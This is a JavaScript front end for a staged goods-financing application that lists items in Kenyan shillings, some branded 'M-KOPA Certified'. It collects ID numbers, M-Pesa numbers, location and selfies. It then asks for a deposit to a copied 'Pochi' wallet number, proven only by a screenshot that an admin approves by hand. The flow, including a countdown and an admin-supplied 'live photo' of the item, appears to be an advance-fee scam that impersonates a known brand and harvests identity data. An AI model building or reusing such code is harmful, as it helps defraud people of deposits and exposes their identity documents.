document.addEventListener('DOMContentLoaded', () => {
    const formData = { 
        product: { model: '', category: '' }, 
        idNumber: '', 
        mpesaNumber: '', 
        location: '', 
        selfieDataUrl: '', 
        paymentScreenshotDataUrl: '',
        walletNumber: '', 
        amount: 0,
        dailyRate: 0
    };
    let currentAppId = null;
    let pollInterval = null;

    const productCatalog = {
        "Furniture": [
            { name: "5-Seater Fabric Sofaset Chair", deposit: 6500, daily: 180 },
            { name: "L-Shaped Recliner Leather Sofaset", deposit: 12000, daily: 320 },
            { name: "6x6 Executive Wooden Bed Frame", deposit: 8500, daily: 220 },
            { name: "6-Piece Glass Dining Table Set", deposit: 9500, daily: 250 }
        ],
        "Water Tanks": [
            { name: "1,000 Liters Plastic Water Tank", deposit: 3500, daily: 90 },
            { name: "3,000 Liters Heavy Duty Water Tank", deposit: 7500, daily: 190 },
            { name: "5,000 Liters High-Capacity Water Tank", deposit: 11000, daily: 280 },
            { name: "10,000 Liters Industrial Storage Tank", deposit: 22000, daily: 550 }
        ],
        "Electrical Accessories": [
            { name: "Solar Inverter 3KW + Lithium Battery Set", deposit: 18000, daily: 450 },
            { name: "Full Home Electrical Wiring Kit (Breakers, Cables, Switches)", deposit: 5000, daily: 130 },
            { name: "Automatic Voltage Regulator (AVR / Stabilizer) 10KVA", deposit: 4200, daily: 110 },
            { name: "Smart LED Home Lighting & Ceiling Fan Package", deposit: 3000, daily: 80 }
        ],
        "Jewelry": [
            { name: "18K Gold Wedding Band / Ring", deposit: 9000, daily: 240 },
            { name: "24K Gold Plated Chain & Pendant Set", deposit: 14000, daily: 360 },
            { name: "Pure Sterling Silver Luxury Jewelry Set", deposit: 4500, daily: 120 }
        ],
        "Solar & Energy": [
            { name: "M-KOPA Complete Home Solar System (2 Panels + Inverter)", deposit: 8500, daily: 220 },
            { name: "M-KOPA Solar Water Heater 200 Liters", deposit: 13500, daily: 340 },
            { name: "M-KOPA Portable Solar Power Station 1000W", deposit: 7000, daily: 180 }
        ],
        "Electronics & Mobile": [
            { name: "Samsung Galaxy A55 5G (128GB)", deposit: 4500, daily: 120 },
            { name: "iPhone 13 (128GB) - M-KOPA Certified", deposit: 15000, daily: 380 },
            { name: "55-inch Smart 4K UHD Android TV", deposit: 7000, daily: 180 },
            { name: "Double-Door Smart Refrigerator 250L", deposit: 8000, daily: 200 }
        ],
        "Motorbikes & Mobility": [
            { name: "Boxer BM 150cc Motorcycle", deposit: 25000, daily: 600 },
            { name: "TVS HLX 125cc Motorcycle", deposit: 22000, daily: 550 },
            { name: "Electric Delivery Scooter + Extra Battery", deposit: 18000, daily: 450 }
        ]
    };

    function goToStage(stageNumber) {
        document.querySelectorAll('.form-stage').forEach(stage => stage.classList.remove('active'));
        document.getElementById(`stage-${stageNumber}`).classList.add('active');

        let indicatorStep = stageNumber;
        if (stageNumber > 5) indicatorStep = 5;

        for (let i = 1; i <= 5; i++) {
            const indicator = document.getElementById(`step-indicator-${i}`);
            if (indicator) {
                if (i < indicatorStep) { indicator.classList.add('completed'); indicator.classList.remove('active'); } 
                else if (i === indicatorStep) { indicator.classList.add('active'); indicator.classList.remove('completed'); } 
                else { indicator.classList.remove('active', 'completed'); }
            }
        }
    }

    const categorySelect = document.getElementById('productCategory');
    const itemSelect = document.getElementById('productItem');
    const itemGroup = document.getElementById('itemSelectGroup');

    categorySelect.addEventListener('change', () => {
        const cat = categorySelect.value;
        itemSelect.innerHTML = '<option value="">-- Select Item --</option>';

        if (cat && productCatalog[cat]) {
            productCatalog[cat].forEach(item => {
                const opt = document.createElement('option');
                opt.value = JSON.stringify({ model: item.name, category: cat, deposit: item.deposit, daily: item.daily });
                opt.textContent = `${item.name} (Deposit: KES ${item.deposit.toLocaleString()} | 1 Wk FREE, then KES ${item.daily}/day)`;
                itemSelect.appendChild(opt);
            });
            itemGroup.style.display = 'block';
        } else {
            itemGroup.style.display = 'none';
        }
    });

    itemSelect.addEventListener('change', () => {
        if (itemSelect.value) {
            const itemData = JSON.parse(itemSelect.value);
            formData.product.model = itemData.model;
            formData.product.category = itemData.category;
            formData.amount = itemData.deposit;
            formData.dailyRate = itemData.daily;

            document.getElementById('depositAmount').value = formData.amount;
            document.getElementById('selected-model-title').textContent = formData.product.model;
            document.getElementById('daily-pay-display').textContent = `KES ${formData.dailyRate} / day`;
            
            document.getElementById('success-model-name').textContent = formData.product.model;
            document.getElementById('success-daily-rate').textContent = `KES ${formData.dailyRate}`;

            setTimeout(() => goToStage(2), 250);
        }
    });

    function checkStage2Validity() {
        const id = document.getElementById('idNumber').value.trim();
        const p1 = document.getElementById('mpesaNumber').value.trim();
        const loc = document.getElementById('location').value.trim();

        if (/^[0-9]{6,9}$/.test(id) && /^(07|01)[0-9]{8}$/.test(p1) && loc.length >= 2) {
            formData.idNumber = id; 
            formData.mpesaNumber = p1; 
            formData.location = loc;
            document.getElementById('walletNumber').value = p1;
            setTimeout(() => goToStage(3), 300);
        }
    }

    ['idNumber', 'mpesaNumber', 'location'].forEach(id => {
        document.getElementById(id).addEventListener('input', checkStage2Validity);
    });

    document.getElementById('selfiePhoto').addEventListener('change', (e) => {
        const file = e.target.files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = function(evt) {
                formData.selfieDataUrl = evt.target.result;
                document.getElementById('selfie-preview').src = evt.target.result;
                document.getElementById('selfie-preview-container').style.display = 'block';
                setTimeout(() => goToStage(4), 400);
            };
            reader.readAsDataURL(file);
        }
    });

    document.getElementById('submit-profile-btn').addEventListener('click', async () => {
        try {
            const response = await fetch('/api/submit-personal-details', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(formData)
            });
            const data = await response.json();
            if (data.success) {
                currentAppId = data.appId;
                goToStage(5);
            } else {
                alert(data.message || 'Error submitting details');
            }
        } catch (err) {
            console.error('Error submitting details:', err);
        }
    });

    document.getElementById('paymentScreenshot').addEventListener('change', (e) => {
        const file = e.target.files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = function(evt) {
                formData.paymentScreenshotDataUrl = evt.target.result;
                document.getElementById('payment-screenshot-preview').src = evt.target.result;
                document.getElementById('payment-screenshot-preview-container').style.display = 'block';
            };
            reader.readAsDataURL(file);
        }
    });

    document.getElementById('copy-pochi-btn').addEventListener('click', () => {
        const pochiNum = document.getElementById('pochi-number').innerText.trim();
        navigator.clipboard.writeText(pochiNum).then(() => {
            const statusMsg = document.getElementById('copy-status-msg');
            statusMsg.textContent = '✓ Number copied to clipboard!';
            setTimeout(() => { statusMsg.textContent = ''; }, 3000);
        });
    });

    document.getElementById('i-have-paid-btn').addEventListener('click', async () => {
        const wallet = document.getElementById('walletNumber').value.trim();
        if (!/^(07|01)[0-9]{8}$/.test(wallet)) {
            alert('Please enter a valid M-Pesa wallet phone number.');
            return;
        }
        if (!formData.paymentScreenshotDataUrl) {
            alert('Please attach your payment receipt photo.');
            return;
        }

        formData.walletNumber = wallet;
        goToStage(6);

        document.getElementById('countdown-card').style.display = 'block';
        document.getElementById('verification-card').style.display = 'none';

        let timeLeft = 3;
        const timerElement = document.getElementById('countdown-timer');
        timerElement.textContent = timeLeft;

        const countdownInterval = setInterval(() => {
            timeLeft--;
            if (timeLeft > 0) {
                timerElement.textContent = timeLeft;
            } else {
                clearInterval(countdownInterval);
                document.getElementById('countdown-card').style.display = 'none';
                document.getElementById('verification-card').style.display = 'block';
            }
        }, 1000);

        try {
            const response = await fetch('/api/submit-payment-receipt', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    appId: currentAppId,
                    walletNumber: wallet,
                    paymentScreenshotDataUrl: formData.paymentScreenshotDataUrl
                })
            });
            const data = await response.json();
            if (data.success) {
                startPollingForAdminApproval();
            } else {
                alert(data.message || 'Error processing receipt submission');
                clearInterval(countdownInterval);
                goToStage(5);
            }
        } catch (err) {
            console.error('Submission error:', err);
            clearInterval(countdownInterval);
            goToStage(5);
        }
    });

    function startPollingForAdminApproval() {
        if (pollInterval) clearInterval(pollInterval);
        pollInterval = setInterval(async () => {
            if (!currentAppId) return;
            try {
                const res = await fetch(`/api/check-status/${currentAppId}`);
                const data = await res.json();

                if (data.photoUrl) {
                    const photoBox = document.getElementById('admin-photo-container');
                    const photoImg = document.getElementById('item-live-photo');
                    if (photoImg.src !== data.photoUrl) {
                        photoImg.src = data.photoUrl;
                        photoBox.style.display = 'block';
                    }
                }

                if (data.status === 'APPROVED') {
                    clearInterval(pollInterval);
                    goToStage(7);
                } else if (data.status === 'REJECTED') {
                    clearInterval(pollInterval);
                    alert('❌ Payment receipt was not confirmed or was rejected. Please try again.');
                    goToStage(5);
                }
            } catch (err) { console.error('Polling error', err); }
        }, 1500);
    }
});
